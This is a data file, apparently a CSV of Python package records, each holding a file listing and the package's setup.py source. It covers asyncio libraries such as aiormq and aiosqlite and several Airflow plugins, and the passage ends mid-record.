aiormq-6.4.1,0,1,1,1,1,0,0,0,abc.py auth.py base.py channel.py connection.py exceptions.py py.typed tools.py types.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE LICENSE.md MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"import os
from importlib.machinery import SourceFileLoader

from setuptools import find_packages, setup


module = SourceFileLoader(
    ""version"", os.path.join(""aiormq"", ""version.py""),
).load_module()


setup(
    name=""aiormq"",
    version=module.__version__,
    packages=find_packages(exclude=[""tests""]),
    license=module.package_license,
    description=module.package_info,
    long_description=open(""README.rst"").read(),
    url=""https://github.com/mosquito/aiormq"",
    author=module.__author__,
    author_email=module.team_email,
    install_requires=[
        ""pamqp==3.2.0"",
        ""yarl"",
    ],
    keywords=[""rabbitmq"", ""asyncio"", ""amqp"", ""amqp 0.9.1"", ""driver"", ""pamqp""],
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Topic :: Internet"",
        ""Topic :: Software Development"",
        ""Topic :: Software Development :: Libraries"",
        ""Topic :: System :: Clustering"",
        ""Intended Audience :: Developers"",
        ""Natural Language :: English"",
        ""Operating System :: MacOS"",
        ""Operating System :: POSIX"",
        ""Operating System :: Microsoft"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
        ""Programming Language :: Python :: Implementation :: CPython"",
    ],
    python_requires="">=3.7"",
    package_data={""aiormq"": [""py.typed""]},
    extras_require={
        ""develop"": [
            ""aiomisc~=16.0"",
            ""coverage!=4.3"",
            ""coveralls"",
            ""pylava"",
            ""pytest"",
            ""pytest-cov"",
            ""tox>=2.4"",
        ],
    },
)
",1
aiorwlock-1.3.0,0,1,1,1,1,0,0,0,py.typed __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt zip-safe CHANGES.rst LICENSE Makefile MANIFEST.in PKG-INFO README.rst setup.cfg setup.py conftest.py test_corner_cases.py test_rwlock.py,"import os
import re

from setuptools import setup

install_requires = []


def read(f):
    return open(os.path.join(os.path.dirname(__file__), f)).read().strip()


def read_version():
    regexp = re.compile(r""^__version__\W*=\W*'([\d.abrc]+)'"")
    init_py = os.path.join(
        os.path.dirname(__file__), 'aiorwlock', '__init__.py'
    )
    with open(init_py) as f:
        for line in f:
            match = regexp.match(line)
            if match is not None:
                return match.group(1)
        raise RuntimeError('Cannot find version in aiorwlock/__init__.py')


classifiers = [
    'License :: OSI Approved :: Apache Software License',
    'Intended Audience :: Developers',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.7',
    'Programming Language :: Python :: 3.8',
    'Programming Language :: Python :: 3.9',
    'Programming Language :: Python :: 3.10',
    'Operating System :: OS Independent',
    'Development Status :: 4 - Beta',
    'Framework :: AsyncIO',
]

project_urls = {
    'Website': 'https://github.com/aio-libs/aiorwlock',
    'Issues': 'https://github.com/aio-libs/aiorwlock/issues',
}


setup(
    name='aiorwlock',
    version=read_version(),
    description=('Read write lock for asyncio.'),
    long_description='\n\n'.join((read('README.rst'), read('CHANGES.rst'))),
    classifiers=classifiers,
    platforms=['POSIX'],
    author='Nikolay Novik',
    author_email='nickolainovik@gmail.com',
    url='https://github.com/aio-libs/aiorwlock',
    download_url='https://pypi.python.org/pypi/aiorwlock',
    license='Apache 2',
    packages=['aiorwlock'],
    install_requires=install_requires,
    keywords=['aiorwlock', 'lock', 'asyncio'],
    zip_safe=True,
    project_urls=project_urls,
    python_requires='>=3.7.0',
    include_package_data=True,
)
",0
aiosfstream-0.5.0,0,1,1,1,1,0,0,0,.pylintrc auth.py client.py exceptions.py py.typed replay.py _metadata.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt DESCRIPTION.rst make.bat Makefile advanced.rst api.rst changes.rst conf.py global.rst guide.rst index.rst install.rst quickstart.rst replay.png LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_auth.py test_client.py test_exceptions.py test_replay.py __init__.py,"import os
from setuptools import setup, find_packages

here = os.path.abspath(os.path.dirname(__file__))

INSTALL_REQUIRES = [
    ""aiocometd>=0.4.1,<0.5.0"",
    ""aiohttp>=3.1,<4.0""
]
TESTS_REQUIRE = [
    ""asynctest>=0.12.0,<1.0.0"",
    ""coverage>=4.5,<5.0"",
    ""flake8"",
    ""pylint"",
    ""mypy""
]
DOCS_REQUIRE = [
    ""Sphinx>=1.7,<2.0"",
    ""sphinxcontrib-asyncio>=0.2.0"",
    ""sphinx-autodoc-typehints""
]
DEV_REQUIRE = []


def read(file_path):
    with open(os.path.join(here, file_path)) as file:
        return file.read().strip()


metadata = {}
metadata_path = os.path.join(here, ""aiosfstream/_metadata.py"")
exec(read(metadata_path), metadata)


setup(
    name=metadata[""TITLE""],
    version=metadata[""VERSION""],
    description=metadata[""DESCRIPTION""],
    long_description='\n\n'.join((read('DESCRIPTION.rst'),
                                  read('docs/source/changes.rst'))),
    classifiers=[
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Framework :: AsyncIO"",
        ""License :: OSI Approved :: MIT License""
    ],
    keywords=metadata[""KEYWORDS""],
    author=metadata[""AUTHOR""],
    author_email=metadata[""AUTHOR_EMAIL""],
    url=metadata[""URL""],
    project_urls=metadata[""PROJECT_URLS""],
    license=""MIT"",
    packages=find_packages(exclude=(""tests*"", )),
    python_requires="">=3.6.0"",
    install_requires=INSTALL_REQUIRES,
    tests_require=TESTS_REQUIRE,
    extras_require={
        ""tests"": TESTS_REQUIRE,
        ""docs"": DOCS_REQUIRE,
        ""dev"": DEV_REQUIRE + TESTS_REQUIRE + DOCS_REQUIRE
    },
    include_package_data=True,
    test_suite=""tests""
)
",1
aiosignal-1.2.0,0,1,1,1,1,0,0,0,py.typed __init__.py __init__.pyi dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst CONTRIBUTORS.txt conf.py index.rst make.bat Makefile spelling_wordlist.txt LICENSE Makefile MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py conftest.py test_signals.py,"import pathlib
import re
import sys

from setuptools import setup

if sys.version_info < (3, 6):
    raise RuntimeError(""aiosignal 1.x requires Python 3.6+"")


here = pathlib.Path(__file__).parent


txt = (here / ""aiosignal"" / ""__init__.py"").read_text(""utf-8"")
try:
    version = re.findall(r'^__version__ = ""([^""]+)""\r?$', txt, re.M)[0]
except IndexError:
    raise RuntimeError(""Unable to determine version."")

install_requires = [
    ""frozenlist>=1.1.0"",
]


def read(f):
    return (here / f).read_text(""utf-8"").strip()


args = dict(
    name=""aiosignal"",
    version=version,
    description=""aiosignal: a list of registered asynchronous callbacks"",
    long_description=""\n\n"".join((read(""README.rst""), read(""CHANGES.rst""))),
    long_description_content_type=""text/x-rst"",
    classifiers=[
        ""License :: OSI Approved :: Apache Software License"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Development Status :: 5 - Production/Stable"",
        ""Operating System :: POSIX"",
        ""Operating System :: MacOS :: MacOS X"",
        ""Operating System :: Microsoft :: Windows"",
        ""Framework :: AsyncIO"",
    ],
    author=""Nikolay Kim"",
    author_email=""fafhrd91@gmail.com"",
    maintainer=""Martijn Pieters <mj@zopatista.com>"",
    maintainer_email=""aio-libs@googlegroups.com"",
    url=""https://github.com/aio-libs/aiosignal"",
    project_urls={
        ""Chat: Gitter"": ""https://gitter.im/aio-libs/Lobby"",
        ""CI: GitHub Actions"": ""https://github.com/aio-libs/aiosignal/actions"",
        ""Coverage: codecov"": ""https://codecov.io/github/aio-libs/aiosignal"",
        ""Docs: RTD"": ""https://docs.aiosignal.org"",
        ""GitHub: issues"": ""https://github.com/aio-libs/aiosignal/issues"",
        ""GitHub: repo"": ""https://github.com/aio-libs/aiosignal"",
    },
    license=""Apache 2"",
    packages=[""aiosignal""],
    python_requires="">=3.6"",
    install_requires=install_requires,
    include_package_data=True,
)

setup(**args)
",1
aiosmtpd-1.4.2,0,1,1,1,0,0,0,0,controller.py .gitignore auth.rst cli.rst concepts.rst conf.py controller.rst handlers.rst index.rst intro.rst lmtp.rst Makefile manpage.rst migrating.rst NEWS.rst proxyprotocol.rst RTD-requirements.txt smtp.rst testing.rst autoprogramm.py aiosmtpd.css __init__.py handlers.py lmtp.py main.py proxy_protocol.py py.typed test_0packaging.py test_1testsuite.py __init__.py smtp.py helpers.py statuscodes.py __init__.py server.crt server.key server_alt.crt server_alt.key __init__.py conftest.py test_handlers.py test_lmtp.py test_main.py test_proxyprotocol.py test_server.py test_smtp.py test_smtps.py test_starttls.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt bandit.yml DESCRIPTION.rst housekeep.py lgtm.yml LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst readthedocs.yml release.py setup.cfg setup.py tox.ini,"from setuptools import setup

setup()
",1
aiosmtplib-1.1.6,0,1,1,1,1,0,1,0,api.py auth.py compat.py connection.py default.py email.py errors.py esmtp.py protocol.py py.typed response.py smtp.py status.py sync.py __init__.py __main__.py changelog.rst client.rst conf.py index.rst Makefile overview.rst reference.rst usage.rst LICENSE.txt PKG-INFO pyproject.toml README.rst setup.py invalid.crt invalid.key selfsigned.crt selfsigned.key conftest.py smtpd.py test_api.py test_asyncio.py test_auth.py test_commands.py test_compat.py test_config.py test_connect.py test_email_utils.py test_errors.py test_esmtp_utils.py test_live.py test_main.py test_protocol.py test_response.py test_sendmail.py test_sync.py test_timeouts.py test_tls.py __init__.py,"# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['aiosmtplib', 'docs', 'tests']

package_data = \
{'': ['*'], 'tests': ['certs/*']}

extras_require = \
{'docs': ['sphinx>=2,<4', 'sphinx_autodoc_typehints>=1.7.0,<2.0.0'],
 'uvloop': ['uvloop>=0.13,<0.15']}

setup_kwargs = {
    'name': 'aiosmtplib',
    'version': '1.1.6',
    'description': 'asyncio SMTP client',
    'long_description': 'aiosmtplib\n==========\n\n|circleci| |codecov| |pypi-version| |pypi-python-versions| |pypi-status| |downloads|\n|pypi-license| |black|\n\n------------\n\naiosmtplib is an asynchronous SMTP client for use with asyncio.\n\nFor documentation, see `Read The Docs`_.\n\nQuickstart\n----------\n\n.. code-block:: python\n\n    import asyncio\n    from email.message import EmailMessage\n\n    import aiosmtplib\n\n    message = EmailMessage()\n    message[""From""] = ""root@localhost""\n    message[""To""] = ""somebody@example.com""\n    message[""Subject""] = ""Hello World!""\n    message.set_content(""Sent via aiosmtplib"")\n\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(aiosmtplib.send(message, hostname=""127.0.0.1"", port=25))\n\n\nRequirements\n------------\nPython 3.5.2+, compiled with SSL support, is required.\n\n\nBug reporting\n-------------\nBug reports (and feature requests) are welcome via Github issues.\n\n\n\n.. |circleci| image:: https://circleci.com/gh/cole/aiosmtplib/tree/main.svg?style=shield\n           :target: https://circleci.com/gh/cole/aiosmtplib/tree/main\n           :alt: ""aiosmtplib CircleCI build status""\n.. |pypi-version| image:: https://img.shields.io/pypi/v/aiosmtplib.svg\n                 :target: https://pypi.python.org/pypi/aiosmtplib\n                 :alt: ""aiosmtplib on the Python Package Index""\n.. |pypi-python-versions| image:: https://img.shields.io/pypi/pyversions/aiosmtplib.svg\n.. |pypi-status| image:: https://img.shields.io/pypi/status/aiosmtplib.svg\n.. |pypi-license| image:: https://img.shields.io/pypi/l/aiosmtplib.svg\n.. |codecov| image:: https://codecov.io/gh/cole/aiosmtplib/branch/main/graph/badge.svg\n             :target: https://codecov.io/gh/cole/aiosmtplib\n.. |black| image:: https://img.shields.io/badge/code%20style-black-000000.svg\n           :target: https://github.com/ambv/black\n           :alt: ""Code style: black""\n.. |downloads| image:: https://pepy.tech/badge/aiosmtplib\n               :target: https://pepy.tech/project/aiosmtplib\n               :alt: ""aiosmtplib on pypy.tech""\n.. _Read The Docs: https://aiosmtplib.readthedocs.io/en/stable/overview.html\n',
    'author': 'Cole Maclean',
    'author_email': 'hi@colemaclean.dev',
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://github.com/cole/aiosmtplib',
    'packages': packages,
    'package_data': package_data,
    'extras_require': extras_require,
    'python_requires': '>=3.5.2,<4.0.0',
}


setup(**setup_kwargs)
",0
aiosqlite-0.17.0,0,1,1,1,0,0,1,0,.gitignore .pylint .pyup.yml .readthedocs.yml context.py core.py cursor.py py.typed helpers.py perf.py smoke.py __init__.py __main__.py __init__.py __version__.py CHANGELOG.md CODE_OF_CONDUCT.md CONTRIBUTING.md api.rst changelog.rst conf.py contributing.rst index.rst custom.css badges.html omnilib.html LICENSE makefile MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.rst requirements-dev.txt setup.py,"#!/usr/bin/env python
# setup.py generated by flit for tools that don't yet use PEP 517

from distutils.core import setup

packages = \
['aiosqlite', 'aiosqlite.tests']

package_data = \
{'': ['*']}

install_requires = \
['typing_extensions>=3.7.2']

setup(name='aiosqlite',
      version='0.17.0',
      description='asyncio bridge to the standard sqlite3 module',
      author='John Reese',
      author_email='john@noswap.com',
      url='https://aiosqlite.omnilib.dev',
      packages=packages,
      package_data=package_data,
      install_requires=install_requires,
      python_requires='>=3.6',
     )
",1
aiostream-0.4.4,0,1,1,1,1,0,0,0,aiter_utils.py core.py manager.py pipe.py advanced.py aggregate.py combine.py create.py misc.py select.py time.py transform.py __init__.py test_utils.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.rst setup.cfg setup.py,"import sys
from setuptools import setup

TESTING = any(x in sys.argv for x in [""test"", ""pytest""])
UPLOAD = ""upload_sphinx"" in sys.argv

if not UPLOAD and sys.version_info < (3, 6):
    raise RuntimeError(""aiostream requires Python 3.6"")

with open(""README.rst"", encoding=""utf-8"") as f:
    long_description = f.read()

setup(
    name=""aiostream"",
    version=""0.4.4"",
    packages=[""aiostream"", ""aiostream.stream""],
    setup_requires=[""pytest-runner"" if TESTING else """"],
    install_requires=['async_exit_stack;python_version<""3.7""'],
    tests_require=[""pytest"", ""pytest-asyncio"", ""pytest-cov""],
    description=""Generator-based operators for asynchronous iteration"",
    long_description=long_description,
    url=""https://github.com/vxgmichel/aiostream"",
    license=""GPLv3"",
    classifiers=[
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
    ],
    author=""Vincent Michel"",
    author_email=""vxgmichel@gmail.com"",
)
",0
aiotask_context-0.6.1,0,1,1,1,0,0,0,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup

install_requires = []
tests_require = install_requires + ['pytest']

setup(
    name=""aiotask_context"",
    version=""0.6.1"",
    author=""Manuel Miranda"",
    author_email=""manu.mirandad@gmail.com"",
    description=""Store context information inside the asyncio.Task object"",
    classifiers=[
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
    ],
    packages=['aiotask_context'],
    install_requires=install_requires,
    tests_require=tests_require,
)
",1
airflow-clickhouse-plugin-0.8.2,0,1,1,1,1,0,1,0,clickhouse_hook.py __init__.py clickhouse_operator.py __init__.py clickhouse_sql_sensor.py __init__.py __init__.py __version__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python3

import pathlib
from setuptools import setup, find_packages

import airflow_clickhouse_plugin.__version__ as about

here = pathlib.Path(__file__).parent.absolute()
with open(here / 'README.md') as readme_file:
    long_description = readme_file.read()
with open(here / 'requirements.txt') as requirements_file:
    install_requires = [
        requirement_line.rstrip('\n')
        for requirement_line in requirements_file
    ]

setup(
    name=about.__title__,
    description=about.__description__,
    long_description=long_description,
    long_description_content_type='text/markdown',
    version=about.__version__,
    author=about.__author__,
    author_email=about.__author_email__,
    url=about.__url__,
    packages=find_packages(exclude=('tests', 'tests.*')),
    include_package_data=True,
    python_requires="">=3.6.*"",
    install_requires=install_requires,
    extras_require={
        'pandas': ['apache-airflow[pandas]>=2.0.0,<2.4.0'],
    },
    license=about.__license__,
    zip_safe=False,
    classifiers=[
        'Development Status :: 4 - Beta',
        'Environment :: Plugins',
        'Intended Audience :: Developers',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.6',
    ],
    keywords=['clickhouse', 'airflow'],
)
",1
airflow_code_editor-7.0.0,0,1,1,1,1,0,0,0,airflow_code_editor.py app_builder_view.py auth.py code_editor_view.py commons.py flask_admin_view.py fs.py git.py .gitignore comment.js continuecomment.js dialog.css dialog.js autorefresh.js fullscreen.css fullscreen.js panel.js placeholder.js rulers.js closebrackets.js closetag.js continuelist.js matchbrackets.js matchtags.js trailingspace.js brace-fold.js comment-fold.js foldcode.js foldgutter.css foldgutter.js indent-fold.js markdown-fold.js xml-fold.js anyword-hint.js css-hint.js html-hint.js javascript-hint.js show-hint.css show-hint.js sql-hint.js xml-hint.js coffeescript-lint.js css-lint.js html-lint.js javascript-lint.js json-lint.js lint.css lint.js yaml-lint.js merge.css merge.js loadmode.js multiplex.js multiplex_test.js overlay.js simple.js colorize.js runmode-standalone.js runmode.js runmode.node.js annotatescrollbar.js scrollpastend.js simplescrollbars.css simplescrollbars.js jump-to-line.js match-highlighter.js matchesonscrollbar.css matchesonscrollbar.js search.js searchcursor.js active-line.js mark-selection.js selection-pointer.js tern.css tern.js worker.js hardwrap.js airflow_code_editor.js airflow_code_editor.js.map codemirror.js codemirror.css editor_v1.css editor_v2.css gitweb_bootstrap.css style.css 3024-day.css 3024-night.css abbott.css abcdef.css ambiance-mobile.css ambiance.css ayu-dark.css ayu-mirage.css base16-dark.css base16-light.css bespin.css blackboard.css cobalt.css colorforth.css darcula.css dracula.css duotone-dark.css duotone-light.css eclipse.css elegant.css erlang-dark.css gruvbox-dark.css hopscotch.css icecoder.css idea.css isotope.css juejin.css lesser-dark.css liquibyte.css lucario.css material-darker.css material-ocean.css material-palenight.css material.css mbo.css mdn-like.css midnight.css monokai.css moxer.css neat.css neo.css night.css nord.css oceanic-next.css panda-syntax.css paraiso-dark.css paraiso-light.css pastel-on-dark.css railscasts.css rubyblue.css seti.css shadowfox.css solarized.css ssms.css the-matrix.css tomorrow-night-bright.css tomorrow-night-eighties.css ttcn.css twilight.css vibrant-ink.css xq-dark.css xq-light.css yeti.css yonce.css zenburn.css vue-good-table.css vue-tree.css emacs.js LICENSE material-icons.woff material-icons.woff2 apl.js index.html asciiarmor.js index.html asn.1.js index.html asterisk.js index.html brainfuck.js index.html clike.js index.html scala.html test.js clojure.js index.html test.js cmake.js index.html cobol.js index.html coffeescript.js index.html commonlisp.js index.html crystal.js index.html css.js gss.html gss_test.js index.html less.html less_test.js scss.html scss_test.js test.js cypher.js index.html test.js d.js index.html test.js dart.js index.html diff.js index.html django.js index.html dockerfile.js index.html test.js dtd.js index.html dylan.js index.html test.js ebnf.js index.html ecl.js index.html eiffel.js index.html elm.js index.html erlang.js index.html factor.js index.html fcl.js index.html forth.js index.html fortran.js index.html gas.js index.html gfm.js index.html test.js gherkin.js index.html go.js index.html groovy.js index.html haml.js index.html test.js handlebars.js index.html haskell.js index.html haskell-literate.js index.html haxe.js index.html htmlembedded.js index.html htmlmixed.js index.html http.js index.html idl.js index.html index.html index.html javascript.js json-ld.html test.js typescript.html index.html jinja2.js index.html jsx.js test.js index.html julia.js index.html livescript.js index.html lua.js index.html markdown.js test.js index.html mathematica.js index.html mbox.js meta.js index.html mirc.js index.html mllike.js index.html modelica.js index.html mscgen.js mscgen_test.js msgenny_test.js xu_test.js index.html mumps.js index.html nginx.js index.html nsis.js index.html ntriples.js index.html octave.js index.html oz.js index.html pascal.js index.html pegjs.js index.html perl.js index.html php.js test.js index.html pig.js index.html powershell.js test.js index.html properties.js index.html protobuf.js index.html pug.js index.html puppet.js index.html python.js test.js index.html q.js index.html r.js index.html index.html rpm.js index.html rst.js index.html ruby.js test.js index.html rust.js test.js index.html sas.js index.html sass.js test.js index.html scheme.js index.html shell.js test.js index.html sieve.js index.html slim.js test.js index.html smalltalk.js index.html smarty.js index.html solr.js index.html soy.js test.js index.html sparql.js index.html spreadsheet.js index.html sql.js index.html stex.js test.js index.html stylus.js index.html swift.js test.js index.html tcl.js index.html test.js textile.js index.html tiddlywiki.css tiddlywiki.js index.html tiki.css tiki.js index.html toml.js index.html tornado.js index.html troff.js index.html ttcn.js index.html ttcn-cfg.js index.html turtle.js index.html twig.js index.html vb.js index.html vbscript.js index.html velocity.js index.html test.js verilog.js index.html vhdl.js index.html vue.js index.html test.js wast.js index.html webidl.js index.html test.js xml.js index.html test.js xquery.js index.html yacas.js index.html yaml.js index.html yaml-frontmatter.js index.html z80.js sublime.js vim.js index_admin.html index_appbuilder.html index_body.html index_head.html index_tail.html __init__.py tree.py utils.py VERSION __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md requirements-dev.txt requirements.txt setup.cfg setup.py,"#!/usr/bin/env python
from pathlib import Path
from setuptools import find_packages, setup

HERE = Path(__file__).parent

version = (HERE / ""airflow_code_editor"" / ""VERSION"").read_text().strip()
long_description = (HERE / ""README.md"").read_text()
install_requires = (HERE / ""requirements.txt"").read_text().split(""\n"")

setup(
    name=""airflow_code_editor"",
    version=version,
    packages=find_packages(exclude=[""scripts"", ""scripts.*"", ""tests"", ""tests.*""]),
    include_package_data=True,
    entry_points={
        ""airflow.plugins"": [
            ""airflow_code_editor = airflow_code_editor.airflow_code_editor:CodeEditorPlugin""
        ]
    },
    zip_safe=False,
    url=""https://github.com/andreax79/airflow-code-editor"",
    author=""Andrea Bonomi"",
    author_email=""andrea.bonomi@gmail.com"",
    description=""Apache Airflow code editor and file manager"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    install_requires=install_requires,
    license=""Apache License, Version 2.0"",
    python_requires="">=3.5"",
    classifiers=[
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
    ],
    test_suite='tests',
    tests_require=['pytest'],
)
",1
airflow_dbt-0.4.0,0,1,1,1,1,0,1,0,dbt_hook.py __init__.py dbt_operator.py __init__.py __init__.py __version__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"import io
import os
import sys
from shutil import rmtree
from setuptools import setup, find_packages, Command

here = os.path.abspath(os.path.dirname(__file__))

# Load the package's __version__.py module as a dictionary.
about = {}
with open(os.path.join(here, 'airflow_dbt', '__version__.py')) as f:
    exec(f.read(), about)

with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:
    long_description = f.read()


class UploadCommand(Command):
    """"""Support setup.py upload.""""""

    description = 'Build and publish the package.'
    user_options = []

    @staticmethod
    def status(s):
        """"""Prints things in bold.""""""
        print('\033[1m{0}\033[0m'.format(s))

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        try:
            self.status('Removing previous builds…')
            rmtree(os.path.join(here, 'dist'))
        except OSError:
            pass

        self.status('Building Source and Wheel (universal) distribution…')
        os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))

        self.status('Uploading the package to PyPI via Twine…')
        os.system('twine upload dist/*')

        self.status('Pushing git tags…')
        os.system('git tag v{0}'.format(about['__version__']))
        os.system('git push --tags')

        sys.exit()


setup(
    name='airflow_dbt',
    version=about['__version__'],
    packages=find_packages(exclude=['tests']),
    install_requires=['apache-airflow >= 1.10.3'],
    author='GoCardless',
    author_email='engineering@gocardless.com',
    description='Apache Airflow integration for dbt',
    long_description=long_description,
    long_description_content_type='text/markdown',
    license='MIT',
    url='https://github.com/gocardless/airflow-dbt',
    classifiers=[
        'Development Status :: 5 - Production/Stable',

        'License :: OSI Approved :: MIT License',

        'Operating System :: MacOS :: MacOS X',
        'Operating System :: POSIX :: Linux',

        'Programming Language :: Python :: 3.7',
    ],
    # $ setup.py upload support.
    cmdclass={
        'upload': UploadCommand,
    },
)
",1
airflow-dbt-python-0.14.5,0,1,1,1,1,0,1,0,base.py localfs.py s3.py __init__.py dbt.py dbt.py __init__.py __init__.py __version__.py LICENSE PKG-INFO pyproject.toml README.md setup.py,"# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['airflow_dbt_python',
 'airflow_dbt_python.hooks',
 'airflow_dbt_python.hooks.backends',
 'airflow_dbt_python.operators']

package_data = \
{'': ['*']}

install_requires = \
['dbt-core>=1.0.0']

extras_require = \
{'adapters': ['dbt-postgres>=1.0.0',
              'dbt-redshift>=1.0.0',
              'dbt-snowflake>=1.0.0',
              'dbt-bigquery>=1.0.0',
              'dbt-spark>=1.0.0'],
 'airflow': ['apache-airflow>=2.0'],
 'airflow-providers': ['apache-airflow-providers-amazon>=3.0.0'],
 'bigquery': ['dbt-bigquery>=1.0.0'],
 'postgres': ['dbt-postgres>=1.0.0'],
 'redshift': ['dbt-redshift>=1.0.0'],
 'snowflake': ['dbt-snowflake>=1.0.0'],
 'spark': ['dbt-spark>=1.0.0']}

setup_kwargs = {
    'name': 'airflow-dbt-python',
    'version': '0.14.5',
    'description': 'A dbt operator and hook for Airflow',
    'long_description': '# airflow-dbt-python\n\n[![PyPI version](https://img.shields.io/pypi/v/airflow-dbt-python?style=plastic)](https://pypi.org/project/airflow-dbt-python/)\n[![GitHub build status](https://github.com/tomasfarias/airflow-dbt-python/actions/workflows/test.yaml/badge.svg)](https://github.com/tomasfarias/airflow-dbt-python/actions)\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\n[![Test coverage](https://codecov.io/gh/tomasfarias/airflow-dbt-python/branch/master/graph/badge.svg?token=HBKZ78F11F)](https://codecov.io/gh/tomasfarias/airflow-dbt-python)\n\nA collection of [Airflow](https://airflow.apache.org/) operators and hooks to interface with [`dbt`](https://pypi.org/project/dbt-core/).\n\nRead the [documentation](https://tomasfarias.github.io/airflow-dbt-python/) for examples, installation instructions, and a full reference.\n\n# Installing\n\n## Requirements\n\nairflow-dbt-python requires the latest major version of [`dbt-core`](https://pypi.org/project/dbt-core/) which at the time of writing is version 1. Support for latest dbt features are incorporated shortly after they are released.\n\nTo line up with `dbt-core`, airflow-dbt-python supports Python 3.7, 3.8, 3.9, and 3.10. However, due to installation conflicts, we only test Python 3.10 with `apache-airflow>=2.2`.\n\nDue to dependency conflicts between `dbt-core` and certain versions of `apache-airflow`, airflow-dbt-python **does not require Airflow as a dependency**. We expect airflow-dbt-python to be installed into an environment with Airflow already in it. For more detailed instructions see the [docs](https://tomasfarias.github.io/airflow-dbt-python/getting_started.html).\n\n## From PyPI:\n\n``` shell\npip install airflow-dbt-python\n```\n\nAny `dbt` adapters you require may be installed by specifying extras:\n\n``` shell\npip install airflow-dby-python[snowflake,postgres]\n```\n\n## From this repo:\n\n\nClone the repo:\n``` shell\ngit clone https://github.com/tomasfarias/airflow-dbt-python.git\ncd airflow-dbt-python\n```\n\nWith poetry:\n``` shell\npoetry install\n```\n\nInstall with any necessary extras:\n``` shell\npoetry install -E postgres -E redshift\n```\n\n## In MWAA:\n\nAdd `airflow-dbt-python` to your `requirements.txt` file and edit your Airflow environment to use this new `requirements.txt` file.\n\n# Features\n\nAirflow-dbt-python aims to make dbt a **first-class citizen** of Airflow by supporting additional features that integrate both tools. As you would expect, airflow-dbt-python can run all your dbt workflows in Airflow with the same interface you are used to from the CLI, but without being a mere wrapper: airflow-dbt-python directly interfaces with internal `dbt-core <https://pypi.org/project/dbt-core/>`_ classes, bridging the gap between them and Airflow\'s operator interface.\n\nAs this integration was completed, several features were developed to **extend the capabilities of `dbt`** to leverage Airflow as much as possible. Can you think of a way `dbt` could leverage Airflow that is not currently supported? Let us know in a [GitHub issue](https://github.com/tomasfarias/airflow-dbt-python/issues/new/choose)! The current list of supported features is as follows:\n\n## Independent task execution\n\nAirflow executes [Tasks](https://airflow.apache.org/docs/apache-airflow/stable/concepts/tasks.html) independent of one another: even though downstream and upstream dependencies between tasks exist, the execution of an individual task happens entirely independently of any other task execution (see: [Tasks Relationships](https://airflow.apache.org/docs/apache-airflow/stable/concepts/tasks.html#relationships).\n\nIn order to work with this constraint, airflow-dbt-python runs each dbt command in a **temporary and isolated directory**. Before execution, all the relevant dbt files are copied from supported backends, and after executing the command any artifacts are exported. This ensures dbt can work with any 